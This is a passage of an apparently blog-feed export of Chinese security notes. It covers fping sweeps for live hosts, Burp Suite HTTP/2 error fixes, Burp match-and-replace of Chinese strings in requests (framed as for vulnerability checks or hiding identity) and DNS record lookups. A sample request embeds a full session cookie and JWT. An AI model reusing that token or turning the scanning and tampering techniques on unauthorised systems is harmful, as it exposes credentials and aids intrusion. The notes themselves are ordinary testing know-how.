class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt<br><span class="hljs-number">10.182.14.148</span> is alive<br><span class="hljs-number">10.191.5.21</span> is unreachable<br><span class="hljs-number">10.191.5.22</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="只显示存活主机列表"><a href="#只显示存活主机列表" class="headerlink" title="只显示存活主机列表"></a>只显示存活主机列表</h2><p>fping -a -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt -a<br><span class="hljs-number">10.182.14.148</span><br></code></pre></td></tr></table></figure><h2 id="探测局域网CIDR内存活主机"><a href="#探测局域网CIDR内存活主机" class="headerlink" title="探测局域网CIDR内存活主机"></a>探测局域网CIDR内存活主机</h2><p>fping -a -g ip端</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root@iZbp1191gh7vw52537lyxrZ:~# fping -a -g <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">24</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">172.16.24.136</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite_http2</title>
    <link href="/2024/02/19/security/sectools/burpsuite/burpsuite_http2/"/>
    <url>/2024/02/19/security/sectools/burpsuite/burpsuite_http2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中遇到 dashboard中的一些 event log ，对部分错误日志分析记录</p><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><p>报错均 基于burp suite 2021.10.3版本 </p><h3 id="error-suite-Communication-error-domain"><a href="#error-suite-Communication-error-domain" class="headerlink" title="error-suite-Communication error:domain"></a>error-suite-Communication error:domain</h3><h4 id="报错现象"><a href="#报错现象" class="headerlink" title="报错现象"></a>报错现象</h4><p>suite：Communication error:domain</p><p>Repeater：Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu</p><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当前版本支持 HTTP&#x2F;2，但是会存在部分请求不支持HTTP&#x2F;2，就会报Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu错，可在INSPECTOR中进行协议切换</p><p>在 Project options -&gt; HTTP -&gt; HTTP&#x2F;2有勾选，如果服务支持将默认使用 HTTP&#x2F;2</p><p>Repeater</p><p>请求默认使用 HTTP&#x2F;2协议</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>默认服务都会支持 HTTP&#x2F;1 协议，为避免报错信息，可以将 HTTP&#x2F;2关闭掉</p><h3 id="No-response-received-from-remote-server"><a href="#No-response-received-from-remote-server" class="headerlink" title="No response received from remote server"></a>No response received from remote server</h3><h4 id="报错现象-1"><a href="#报错现象-1" class="headerlink" title="报错现象"></a>报错现象</h4><p>dashboard 中 event log No response received from remote server</p><h4 id="报错原因-1"><a href="#报错原因-1" class="headerlink" title="报错原因"></a>报错原因</h4><p>新版本burpsuite默认支持http2，如果遇到不支持的站点，就会报错</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>1、proxy-&gt;options-&gt;Miscellaneous 勾选使用http&#x2F;1.0进行通信，默认不勾选</p><p>2、Project options-&gt;HTTP-&gt;HTTP&#x2F;2取消勾选默认HTTP&#x2F;2的选项</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proxy_match_replace_chinese</title>
    <link href="/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/"/>
    <url>/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中Proxy模块需要将数据包中的中文字符匹配验证或者匹配替换，用于验证漏洞或者隐藏身份</p><p>例如：将请求中的“信息安全”替换掉</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v1/log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aidesign.test.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Apache=5867067965663.845.1707120756994; _ut=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiaGFpbmluZzMiLCJuaWNrIjoi5L2Z5rW35a6BIiwicm9sZXMiOnt9LCJvcmdhbml6YXRpb24iOlsi5L-h5oGv5a6J5YWoIl0sIm9yZ2FuaXphdGlvbnQzIjpbIuaWsOa1qumbhuWbol_lvq7ljZpf5b6u5Y2aQ09P57uE57uHIl0sImlwIjoiMTAuMjIyLjI4LjUiLCJ0aWNrZXQiOiJTVC0xMDQxOTg1LXB3RHlpZmFYM20xZjZhcmlZTnVVIiwic2VydmljZSI6Imh0dHAlM0ElMkYlMkZpLmZlLnNpbmEuY24lMkZ2ZXJpZnklMkZhdXRoJTNGYmFja3VybCUzRGh0dHAlMjUzQSUyNTJGJTI1MkZhaWRlc2lnbi53ZWliby5jb20lMjUyRiIsImxvZ2luVGltZSI6MTcwNzEyMDc3NDE2MH0sImlhdCI6MTcwNzEyMDc3NCwiZXhwIjoxNzA3MjA3MTc0fQ.G5OAkK1kN3-jCqY5728OtGlEmcF37of6YZfxep--Meg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json,  */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>238<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://aidesign.test.com<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://aidesign.test.com/<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;report&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;_exposure&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;ek&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;et&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pk&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;187522&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ts&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1707120897000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dept&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test_信息安全&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;image&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;home&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;uid&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><h2 id="自动匹配解决方案"><a href="#自动匹配解决方案" class="headerlink" title="自动匹配解决方案"></a>自动匹配解决方案</h2><h3 id="匹配验证解决方案"><a href="#匹配验证解决方案" class="headerlink" title="匹配验证解决方案"></a>匹配验证解决方案</h3><p>将要匹配的中文转换为十六进制\x格式（大小写不影响），使用正则 Regex 匹配</p><p>中文转换为十六进制可以使用线上工具转换，也可以直接从请求包Hex格式中提取，提取的格式增加0x即可</p><p>例如：</p><p>字符串：信息安全  </p><p>十六进制：E4 BF A1 E6 81 AF E5 AE 89 E5 85 A8  \xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8</p><h3 id="匹配替换解决方案"><a href="#匹配替换解决方案" class="headerlink" title="匹配替换解决方案"></a>匹配替换解决方案</h3><h4 id="中文替换为中文（未验证成功）"><a href="#中文替换为中文（未验证成功）" class="headerlink" title="中文替换为中文（未验证成功）"></a>中文替换为中文（未验证成功）</h4><p>测试过程中发现如果要将中文替换为中文，使用十六进制格式可以匹配到，但是替换不了</p><p>信息安全-&gt;总裁办</p><p>失败的测试过程：</p><p>1、替换字符转为十六进制</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>现象：</p><p>burpsuite 请求“信息安全”字段直接替换为十六进制字符串\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>2、替换字符转为unicode字符</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\u603b\u88c1\u529e</p><p>现象：</p><p>burpsuite 请求“信息安全”字段替换为去除\的字符串u603bu88c1u529e</p><p>3、替换字符直接设置为中文</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;总裁办</p><p>现象：</p><p>burpsuite 请求“信息安全”字段被替换为乱码字符，查看hex值发现乱码字符为 3B C1</p><h4 id="中文替换为非中文"><a href="#中文替换为非中文" class="headerlink" title="中文替换为非中文"></a>中文替换为非中文</h4><p>中文替换为英文、数字等，只需要将匹配的中文转换为十六进制\x格式，英文和数字等不需要转换</p><p>信息安全-&gt;test</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;test</p><h2 id="手动匹配解决方案"><a href="#手动匹配解决方案" class="headerlink" title="手动匹配解决方案"></a>手动匹配解决方案</h2><p>匹配替换，无论是替换为中文还是非中文字符，拦截直接修改为对应字符就行</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] http替换内容为中文的解决方案 Mi_Bo 2018-05-18 16:54:56<br>链接：<a href="https://blog.csdn.net/Mi_Bo/article/details/80366592">https://blog.csdn.net/Mi_Bo/article/details/80366592</a><br>[2] Match and Replace does not seem to work correctly with CJK characters Jackpot Sep 07, 2023 12:24PM UTC<br><a href="https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112">https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dnsip</title>
    <link href="/2024/02/06/network/dns/dnsip/"/>
    <url>/2024/02/06/network/dns/dnsip/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>记录常用的 DNS IP，便于使用配置</p><h2 id="阿里云DNS"><a href="#阿里云DNS" class="headerlink" title="阿里云DNS"></a>阿里云DNS</h2><p>nameserver 223.5.5.5<br>nameserver 223.6.6.6<br>nameserver 2400:3200::1<br>nameserver 2400:3200:baba::1</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 阿里云公共DNS<br><a href="https://alidns.com/">https://alidns.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>dns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_record_operation</title>
    <link href="/2024/02/06/network/dns/dns_record_operation/"/>
    <url>/2024/02/06/network/dns/dns_record_operation/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对常见的DNS记录及操作学习总结</p><h1 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>主机名称，域名对应的IPv4地址</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-domain"><a href="#nslookup-domain" class="headerlink" title="nslookup domain"></a>nslookup domain</h4><p>nslookup 不指定参数，默认查询A记录</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">~</span> <span class="hljs-string">nslookup</span> <span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Server:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02</span><br><span class="hljs-attr">Address:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02#53</span><br><br><span class="hljs-attr">Non-authoritative answer:</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">39.156</span><span class="hljs-number">.66</span><span class="hljs-number">.10</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">110.242</span><span class="hljs-number">.68</span><span class="hljs-number">.66</span><br></code></pre></td></tr></table></figure><h4 id="host-t-A-domain"><a href="#host-t-A-domain" class="headerlink" title="host -t A domain"></a>host -t A domain</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  ~ host -t A <span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">baidu.com </span>has <span class="hljs-keyword">address </span><span class="hljs-number">39</span>.<span class="hljs-number">156</span>.<span class="hljs-number">66</span>.<span class="hljs-number">10</span><br><span class="hljs-keyword">baidu.com </span>has <span class="hljs-keyword">address </span><span class="hljs-number">110</span>.<span class="hljs-number">242</span>.<span class="hljs-number">68</span>.<span class="hljs-number">66</span><br></code></pre></td></tr></table></figure><h1 id="AAAA记录"><a href="#AAAA记录" class="headerlink" title="AAAA记录"></a>AAAA记录</h1><p>IPv6版本的A记录，域名对应的IPv6地址</p><h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-1"><a href="#查询-1" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-AAAA-domain"><a href="#nslookup-type-AAAA-domain" class="headerlink" title="nslookup -type&#x3D;AAAA domain"></a>nslookup -type&#x3D;AAAA domain</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ nslookup -<span class="hljs-built_in">type</span>=AAAA www.weibo.<span class="hljs-keyword">cn</span> <br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>www.weibo.<span class="hljs-keyword">cn</span>canonical name = weibo.<span class="hljs-keyword">cn</span>.<br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1023</span>:<span class="hljs-number">3</span>::<span class="hljs-number">20</span><br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">17</span><br>weibo.<span class="hljs-keyword">cn</span><span class="hljs-built_in">has</span> AAAA address <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">18</span><br><br>Authoritative answers can <span class="hljs-keyword">be</span> found from:<br></code></pre></td></tr></table></figure><h4 id="host-t-AAAA-domain"><a href="#host-t-AAAA-domain" class="headerlink" title="host -t AAAA domain"></a>host -t AAAA domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t AAAA www<span class="hljs-selector-class">.weibo</span><span class="hljs-selector-class">.cn</span><br>www<span class="hljs-selector-class">.weibo</span><span class="hljs-selector-class">.cn</span> is an alias <span class="hljs-keyword">for</span> weibo<span class="hljs-selector-class">.cn</span>.<br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">17</span><br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1023</span>:<span class="hljs-number">3</span>::<span class="hljs-number">20</span><br>weibo<span class="hljs-selector-class">.cn</span> has IPv6 <span class="hljs-selector-tag">address</span> <span class="hljs-number">2400</span>:<span class="hljs-number">89</span>c0:<span class="hljs-number">1013</span>:<span class="hljs-number">3</span>::<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h1 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h1><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>域名服务器记录，也就是该记录指定由那台域名服务器解析域名</p><h2 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-2"><a href="#查询-2" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-NS-domain"><a href="#nslookup-type-NS-domain" class="headerlink" title="nslookup -type&#x3D;NS domain"></a>nslookup -type&#x3D;NS domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=NS baidu<span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns3<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns4<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns7<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>nameserver = ns2<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br></code></pre></td></tr></table></figure><h3 id="host-t-NS-domain"><a href="#host-t-NS-domain" class="headerlink" title="#### host -t NS domain"></a>#### host -t NS domain</h3><h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><p>NS记录依赖于A记录的解析，要设置NS记录，首先需要给NS记录创建A记录</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">~</span> <span class="hljs-string">nslookup</span> <span class="hljs-string">ns3.baidu.com</span><br><span class="hljs-attr">Server:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02</span><br><span class="hljs-attr">Address:</span><span class="hljs-number">2408</span><span class="hljs-string">:8409:1890:930d:dd4d:ca4d:dc8a:cc02#53</span><br><br><span class="hljs-attr">Non-authoritative answer:</span><br><span class="hljs-attr">Name:</span><span class="hljs-string">ns3.baidu.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">112.80</span><span class="hljs-number">.248</span><span class="hljs-number">.64</span><br></code></pre></td></tr></table></figure><h1 id="SOA记录"><a href="#SOA记录" class="headerlink" title="SOA记录"></a>SOA记录</h1><h2 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h2><p>起始授权记录，用于指定NS记录中主DNS服务器</p><p>“起始授权记录，用于一个区域的开始，SOA记录后的所有信息均是用于控制这个区域的，每个区域数据库文件都必须包含一个SOA记录，并且必须是其中的第一个资源记录，用以标识DNS服务器管理的起始位置，SOA说明能解析这个区域的dns服务器中哪个是主服务器<br>例如，NS记录说明了有两个DNS服务器负责baidu.com的域名解析，但哪个是主服务器呢？这个任务由SOA记录来完成”</p><h2 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-3"><a href="#查询-3" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-SOA-domain"><a href="#nslookup-type-SOA-domain" class="headerlink" title="nslookup -type&#x3D;SOA domain"></a>nslookup -type&#x3D;SOA domain</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  ~ nslookup -type=SOA <span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">Server:</span><span class="hljs-number">10</span>.<span class="hljs-number">211</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br><span class="hljs-keyword">Address:</span><span class="hljs-number">10</span>.<span class="hljs-number">211</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><span class="hljs-comment">#53</span><br><br><span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">origin </span>= dns.<span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span>mail <span class="hljs-keyword">addr </span>= sa.<span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span>serial = <span class="hljs-number">2012145588</span><br>refresh = <span class="hljs-number">300</span><br>retry = <span class="hljs-number">300</span><br>expire = <span class="hljs-number">2592000</span><br>minimum = <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><h4 id="host-t-SOA-domain"><a href="#host-t-SOA-domain" class="headerlink" title="host -t SOA domain"></a>host -t SOA domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t NS baidu<span class="hljs-selector-class">.com</span><br>baidu<span class="hljs-selector-class">.com</span> name server ns2<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns4<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns3<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns7<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>➜  ~ host -t SOA baidu<span class="hljs-selector-class">.com</span><br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><p>比较权威DNS上的SOA记录</p><p>host -C domain</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -C baidu<span class="hljs-selector-class">.com</span><br>Nameserver <span class="hljs-number">220.181</span>.<span class="hljs-number">33.31</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">240</span>e:<span class="hljs-number">940</span>:<span class="hljs-number">603</span>:<span class="hljs-number">4</span>:<span class="hljs-number">0</span>:ff:b01b:<span class="hljs-number">589</span>a:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record 